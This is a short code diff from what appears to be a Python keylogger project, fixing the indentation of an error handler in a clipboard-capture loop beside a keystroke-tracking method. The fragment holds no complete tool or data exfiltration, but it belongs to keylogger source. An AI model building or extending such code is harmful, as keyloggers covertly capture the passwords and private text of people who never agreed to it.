@@ -54,8 +54,8 @@ class Keylogger:
                     txt = copied
                 # Wait for 0.5 seconds
                 time.sleep(SLEEP)\
-                except Exception as error:
-                    print("error in extracting clipboard: " + error)
+            except Exception as error:
+                 print("error in extracting clipboard: " + error)
 
     def keyboard_tracker(self, event):
         key = event.name
